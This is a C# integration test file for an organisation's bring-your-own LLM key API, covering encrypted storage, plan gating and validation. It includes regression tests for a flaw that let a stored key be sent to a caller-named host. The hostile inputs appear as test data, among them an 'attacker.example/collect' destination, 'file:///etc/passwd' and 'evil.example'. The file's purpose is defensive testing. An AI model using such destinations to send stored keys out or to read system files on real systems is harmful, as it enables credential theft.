using System.Net;
using System.Net.Http.Json;
using System.Security.Cryptography;
using System.Text.Json;
using Condux.ControlPlane.Llm;
using Condux.Core.Secrets;
using Condux.IntegrationTests.Fixtures;
using Microsoft.AspNetCore.Hosting;
using Microsoft.AspNetCore.Mvc.Testing;
using Microsoft.AspNetCore.TestHost;
using Microsoft.Extensions.DependencyInjection;
using Npgsql;
using Xunit;

namespace Condux.IntegrationTests;

/// <summary>
/// The BYO-key registry (#65): an Enterprise org can set a validated LLM key; it is stored encrypted
/// (never round-tripped), gated on the plan's ByoKey feature, and validated live before save.
/// </summary>
[Trait("Category", "Integration")]
public sealed class LlmConfigApiTest(PostgresFixture pg) : IClassFixture<PostgresFixture>
{
    private static readonly string SecretKey = Convert.ToBase64String(RandomNumberGenerator.GetBytes(32));

    private sealed class StubValidator(bool valid) : ILlmKeyValidator
    {
        public static readonly IReadOnlyList<LlmModel> Models = [new LlmModel("claude-opus-4-8", "Claude Opus 4.8")];

        public Task<IReadOnlyList<LlmModel>?> ListModelsAsync(
            string provider, string baseUrl, string apiKey, CancellationToken cancellationToken = default) =>
            Task.FromResult(valid ? Models : null);
    }

    private WebApplicationFactory<Program> CreateApp(bool keyValid = true) =>
        ControlPlaneApp.Create(pg.ConnectionString).WithWebHostBuilder(b =>
        {
            b.UseSetting("CONDUX_SECRET_KEY", SecretKey);
            b.ConfigureTestServices(s => s.AddSingleton<ILlmKeyValidator>(new StubValidator(keyValid)));
        });

    // Not static: needs the connection string to set the tier out of band, since POST /api/orgs always
    // creates Free and only the Stripe webhook moves an org off it.
    private async Task<long> CreateOrgAsync(HttpClient client, int tier)
    {
        var resp = await client.PostAsJsonAsync("/api/orgs",
            new { slug = "org-" + Guid.NewGuid().ToString("N"), name = "Org" });
        var id = (await resp.Content.ReadFromJsonAsync<JsonElement>()).GetProperty("id").GetInt64();
        await OrgSeed.SetTierAsync(pg.ConnectionString, id, tier);
        return id;
    }

    [Fact]
    public async Task Enterprise_org_sets_reads_and_deletes_a_key_stored_encrypted()
    {
        var client = CreateApp().CreateClient();
        await ApiAuth.SignUpAsync(client);
        var orgId = await CreateOrgAsync(client, tier: 3); // Enterprise has ByoKey

        const string apiKey = "sk-ant-secret-value-xyz";
        var put = await client.PutAsJsonAsync($"/api/orgs/{orgId}/llm-config",
            new { provider = "anthropic", model = "claude-opus-4-8", apiKey });
        Assert.Equal(HttpStatusCode.OK, put.StatusCode);

        // The read returns metadata, never the key.
        var got = await client.GetFromJsonAsync<JsonElement>($"/api/orgs/{orgId}/llm-config");
        Assert.Equal("anthropic", got.GetProperty("provider").GetString());
        Assert.Equal("claude-opus-4-8", got.GetProperty("model").GetString());
        Assert.False(got.TryGetProperty("apiKey", out _));
        Assert.False(got.TryGetProperty("keyEncrypted", out _));

        // The stored key is ciphertext, not plaintext, and decrypts back with the master key.
        var encrypted = await ReadEncryptedKeyAsync(orgId);
        Assert.DoesNotContain(apiKey, System.Text.Encoding.UTF8.GetString(encrypted));
        Assert.Equal(apiKey, new SecretBox(SecretKey).Open(encrypted));

        Assert.Equal(HttpStatusCode.NoContent,
            (await client.DeleteAsync($"/api/orgs/{orgId}/llm-config")).StatusCode);
        Assert.Equal(HttpStatusCode.NotFound,
            (await client.GetAsync($"/api/orgs/{orgId}/llm-config")).StatusCode);
    }

    [Fact]
    public async Task Models_can_be_listed_for_a_provided_key()
    {
        var client = CreateApp().CreateClient();
        await ApiAuth.SignUpAsync(client);
        var orgId = await CreateOrgAsync(client, tier: 3);

        var resp = await client.PostAsJsonAsync($"/api/orgs/{orgId}/llm-config/models",
            new { provider = "anthropic", apiKey = "sk-ant-x" });
        Assert.Equal(HttpStatusCode.OK, resp.StatusCode);
        var models = (await resp.Content.ReadFromJsonAsync<JsonElement>()).GetProperty("models");
        Assert.Equal("claude-opus-4-8", models[0].GetProperty("id").GetString());
        Assert.Equal("Claude Opus 4.8", models[0].GetProperty("displayName").GetString());
    }

    [Fact]
    public async Task A_tier_without_byo_key_is_refused()
    {
        var client = CreateApp().CreateClient();
        await ApiAuth.SignUpAsync(client);
        var orgId = await CreateOrgAsync(client, tier: 0); // Free — no ByoKey

        var put = await client.PutAsJsonAsync($"/api/orgs/{orgId}/llm-config",
            new { provider = "anthropic", model = "claude-opus-4-8", apiKey = "sk-ant-x" });
        Assert.Equal(HttpStatusCode.Conflict, put.StatusCode);
        var body = await put.Content.ReadFromJsonAsync<JsonElement>();
        Assert.Equal("byo_key_requires_upgrade", body.GetProperty("error").GetString());
    }

    [Fact]
    public async Task An_invalid_key_is_rejected_before_it_is_stored()
    {
        var client = CreateApp(keyValid: false).CreateClient();
        await ApiAuth.SignUpAsync(client);
        var orgId = await CreateOrgAsync(client, tier: 3);

        var put = await client.PutAsJsonAsync($"/api/orgs/{orgId}/llm-config",
            new { provider = "anthropic", model = "claude-opus-4-8", apiKey = "sk-ant-bad" });
        Assert.Equal(HttpStatusCode.BadRequest, put.StatusCode);
        Assert.Equal(HttpStatusCode.NotFound,
            (await client.GetAsync($"/api/orgs/{orgId}/llm-config")).StatusCode);
    }

    [Fact]
    public async Task The_routes_404_when_the_secret_store_is_not_configured()
    {
        // No CONDUX_SECRET_KEY set → the feature is off.
        var client = ControlPlaneApp.Create(pg.ConnectionString).CreateClient();
        await ApiAuth.SignUpAsync(client);
        var orgId = await CreateOrgAsync(client, tier: 3);

        Assert.Equal(HttpStatusCode.NotFound,
            (await client.GetAsync($"/api/orgs/{orgId}/llm-config")).StatusCode);
    }

    // ---- Where a stored key is allowed to go -----------------------------------------------------
    //
    // The models endpoint decrypts the org's key when the caller supplies none, and used to send it to
    // the provider and base URL from the REQUEST BODY. So any org admin could read a key another admin
    // stored, by naming a host they control, which defeats both the sealing at rest and the read
    // endpoint's deliberate refusal to return it.
    //
    // These record what the validator was ASKED to do. Asserting on the status code would pass against
    // the vulnerable code, because the key is handed over before the response is shaped.

    private sealed record ValidatorCall(string Provider, string BaseUrl, string ApiKey);

    private sealed class RecordingValidator : ILlmKeyValidator
    {
        public List<ValidatorCall> Calls { get; } = [];

        public Task<IReadOnlyList<LlmModel>?> ListModelsAsync(
            string provider, string baseUrl, string apiKey, CancellationToken cancellationToken = default)
        {
            Calls.Add(new ValidatorCall(provider, baseUrl, apiKey));
            return Task.FromResult<IReadOnlyList<LlmModel>?>(StubValidator.Models);
        }
    }

    private (WebApplicationFactory<Program> App, RecordingValidator Validator) CreateRecordingApp()
    {
        var validator = new RecordingValidator();
        var app = ControlPlaneApp.Create(pg.ConnectionString).WithWebHostBuilder(b =>
        {
            b.UseSetting("CONDUX_SECRET_KEY", SecretKey);
            b.ConfigureTestServices(s => s.AddSingleton<ILlmKeyValidator>(validator));
        });
        return (app, validator);
    }

    [Fact]
    public async Task The_stored_key_is_never_sent_to_a_destination_the_caller_named()
    {
        var (app, validator) = CreateRecordingApp();
        var client = app.CreateClient();
        await ApiAuth.SignUpAsync(client);
        var orgId = await CreateOrgAsync(client, tier: 3);

        const string storedKey = "sk-openai-stored-secret";
        Assert.Equal(HttpStatusCode.OK, (await client.PutAsJsonAsync($"/api/orgs/{orgId}/llm-config",
            new
            {
                provider = "openai-compat",
                model = "gpt-4o",
                baseUrl = "https://api.openai.com/v1",
                apiKey = storedKey,
            })).StatusCode);
        validator.Calls.Clear();

        // No apiKey, so the endpoint falls back to the stored one. The body names somewhere else.
        var resp = await client.PostAsJsonAsync($"/api/orgs/{orgId}/llm-config/models",
            new { provider = "openai-compat", baseUrl = "https://attacker.example/collect" });

        // Assert a call happened FIRST. DoesNotContain and All both pass on an empty list, so without
        // this the two assertions below would hold for an endpoint that made no request at all.
        Assert.Equal(HttpStatusCode.OK, resp.StatusCode);
        var call = Assert.Single(validator.Calls);

        // The stored key was used, and only against the destination stored beside it.
        Assert.Equal(storedKey, call.ApiKey);
        Assert.Equal("https://api.openai.com/v1", call.BaseUrl);
        Assert.DoesNotContain("attacker.example", call.BaseUrl);
    }

    /// <summary>
    /// The legitimate path is unchanged: a caller adding or replacing a key supplies both the credential
    /// and where it goes, so naming a destination is theirs to do.
    /// </summary>
    [Fact]
    public async Task A_caller_supplied_key_may_still_name_its_own_destination()
    {
        var (app, validator) = CreateRecordingApp();
        var client = app.CreateClient();
        await ApiAuth.SignUpAsync(client);
        var orgId = await CreateOrgAsync(client, tier: 3);

        var resp = await client.PostAsJsonAsync($"/api/orgs/{orgId}/llm-config/models",
            new { provider = "openai-compat", baseUrl = "http://vllm.internal:8000/v1", apiKey = "sk-mine" });

        Assert.Equal(HttpStatusCode.OK, resp.StatusCode);
        Assert.Contains(validator.Calls,
            c => c.BaseUrl == "http://vllm.internal:8000/v1" && c.ApiKey == "sk-mine");
    }

    /// <summary>
    /// A row written before the store-side check existed was never validated, so the stored value needs
    /// checking where it is USED, not only where it is written. Otherwise the fix would cover the value a
    /// caller sends today and miss the one an attacker planted yesterday, which is the reachable case.
    /// </summary>
    [Fact]
    public async Task A_stored_base_url_that_predates_validation_is_refused_before_any_provider_call()
    {
        var (app, validator) = CreateRecordingApp();
        var client = app.CreateClient();
        await ApiAuth.SignUpAsync(client);
        var orgId = await CreateOrgAsync(client, tier: 3);

        Assert.Equal(HttpStatusCode.OK, (await client.PutAsJsonAsync($"/api/orgs/{orgId}/llm-config",
            new
            {
                provider = "openai-compat",
                model = "gpt-4o",
                baseUrl = "https://api.openai.com/v1",
                apiKey = "sk-openai-stored-secret",
            })).StatusCode);

        // Write past the endpoint, the way a row predating the check would look.
        await SetStoredBaseUrlAsync(orgId, "file:///etc/passwd");
        validator.Calls.Clear();

        var resp = await client.PostAsJsonAsync($"/api/orgs/{orgId}/llm-config/models",
            new { provider = "openai-compat" });

        Assert.Equal(HttpStatusCode.BadRequest, resp.StatusCode);
        Assert.Empty(validator.Calls);
    }

    private async Task SetStoredBaseUrlAsync(long orgId, string baseUrl)
    {
        await using var conn = new NpgsqlConnection(pg.ConnectionString);
        await conn.OpenAsync();
        await using var cmd = new NpgsqlCommand(
            "UPDATE llm_configs SET base_url = @url WHERE org_id = @org", conn);
        cmd.Parameters.AddWithValue("url", baseUrl);
        cmd.Parameters.AddWithValue("org", orgId);
        Assert.Equal(1, await cmd.ExecuteNonQueryAsync());
    }

    [Theory]
    [InlineData("file:///etc/passwd")]
    [InlineData("//evil.example/v1")]
    [InlineData("not a url")]
    public async Task A_malformed_base_url_is_refused_before_any_provider_call(string baseUrl)
    {
        var (app, validator) = CreateRecordingApp();
        var client = app.CreateClient();
        await ApiAuth.SignUpAsync(client);
        var orgId = await CreateOrgAsync(client, tier: 3);

        var resp = await client.PostAsJsonAsync($"/api/orgs/{orgId}/llm-config/models",
            new { provider = "openai-compat", baseUrl, apiKey = "sk-mine" });

        Assert.Equal(HttpStatusCode.BadRequest, resp.StatusCode);
        Assert.Empty(validator.Calls);
    }

    /// <summary>
    /// The models route now applies the plan gate the PUT always had. Without it, a tier not entitled to
    /// hold a BYO key could still have one read and used on its behalf.
    /// </summary>
    [Fact]
    public async Task The_models_route_refuses_a_tier_without_byo_key()
    {
        var (app, validator) = CreateRecordingApp();
        var client = app.CreateClient();
        await ApiAuth.SignUpAsync(client);
        var orgId = await CreateOrgAsync(client, tier: 0); // Free has no ByoKey

        var resp = await client.PostAsJsonAsync($"/api/orgs/{orgId}/llm-config/models",
            new { provider = "anthropic", apiKey = "sk-mine" });

        Assert.Equal(HttpStatusCode.Conflict, resp.StatusCode);
        var body = await resp.Content.ReadFromJsonAsync<JsonElement>();
        Assert.Equal("byo_key_requires_upgrade", body.GetProperty("error").GetString());
        Assert.Empty(validator.Calls);
    }

    private async Task<byte[]> ReadEncryptedKeyAsync(long orgId)
    {
        await using var conn = new NpgsqlConnection(pg.ConnectionString);
        await conn.OpenAsync();
        await using var cmd = new NpgsqlCommand("SELECT key_encrypted FROM llm_configs WHERE org_id = @org", conn);
        cmd.Parameters.AddWithValue("org", orgId);
        return (byte[])(await cmd.ExecuteScalarAsync())!;
    }
}
